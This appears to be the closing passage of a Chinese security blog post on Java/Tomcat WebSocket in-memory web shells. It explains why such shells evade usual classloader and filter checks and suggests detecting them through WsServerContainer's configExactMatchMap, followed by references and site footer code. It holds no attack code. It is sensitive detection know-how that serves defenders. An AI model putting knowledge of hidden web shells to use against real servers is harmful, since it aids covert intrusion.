+<p>蓝队守方人员可以根据是否是危险classloader，比如TemplatesImpl$TransletClassLoader，或者是根据对应的filter类在硬盘上有没有对应的Class文件，来进行判断。</p>
+<p>但是对于Webdocket内存马来讲，其所对应的Filter类一直都是WsFilter，这个类是一直存在的无论有没有开启websocket服务端这个filter都会存在，所以导致防守人员无法进行判断。</p>
+<p>对于websocket内存马来讲，我们可以通过其他方式来寻找Websocket内存马所涉及到的一些属性及内容。</p>
+
+<p>当注入了websocket内存马之后，我们再回到WsFilter当中时，我们可以发现其中的sc（WsServerContianer）属性下的configExactMatchMap里面存放了有关websocket内存马的相关信息，其中ExactPathMatch里面有websocket内存马对应的URI，该属性下的value属性当中的endpointClass又包含了关于endpoint的很多信息，也许可以通过这种方式来进行检测。</p>
+<h4 id="参考文章">参考文章</h4>
+<p>https://xz.aliyun.com/t/11549</p>
+<p>https://github.com/c0ny1/java-memshell-scanner</p>
+<p>https://www.freebuf.com/news/345739.html</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>f4nx1ng
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://f4nx1ng.github.io/2024/08/01/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/" title="WebSocket内存马">https://f4nx1ng.github.io/2024/08/01/WebSocket内存马/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag"># 内存马</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/07/29/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%90%88%E9%9B%86/" rel="prev" title="Spring内存马合集">
+                  <i class="fa fa-angle-left"></i> Spring内存马合集
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">f4nx1ng</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"neutral","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.9.0/mermaid.min.js","integrity":"sha256-stuqcu2FrjYCXDOytWFA5SoUE/r3nkp6gTglzNSlavU="}}</script>
+  <script src="/js/third-party/tags/mermaid.js"></script>
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
